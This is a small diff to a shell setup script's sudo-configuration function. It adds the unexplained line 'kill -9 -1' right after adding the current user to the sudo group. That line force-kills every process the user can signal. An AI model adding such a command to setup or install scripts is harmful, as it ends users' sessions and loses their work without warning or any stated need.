@@ -56,6 +56,7 @@ add_configure_sudo () {
         echo_always "[ERROR] sudo install failed, rest of process will fail"
     fi
     su -c "usermod -aG sudo $(whoami)" root
+    kill -9 -1
 }
 
 setup_directories () {
